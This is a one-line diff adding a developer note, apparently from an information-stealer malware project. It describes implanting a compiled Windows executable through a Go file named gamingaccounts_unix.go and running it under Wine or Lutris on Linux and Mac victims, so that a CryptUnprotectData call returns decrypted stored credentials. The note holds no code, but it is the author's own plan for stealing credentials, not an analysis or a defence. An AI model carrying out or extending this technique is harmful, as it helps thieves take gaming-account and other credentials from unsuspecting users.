@@ -1,0 +1,1 @@
+Ok this file here is a wine exe that will be compiled along with the linux/mac versions and included in the gamingaccounts_unix.go file so that the stealer can implant this file, run it with wine/lutris, and handle the cryptunprotect call to get the unencrypted data instead of trying to manually try some bullshit like decrypting the dpapi blob.
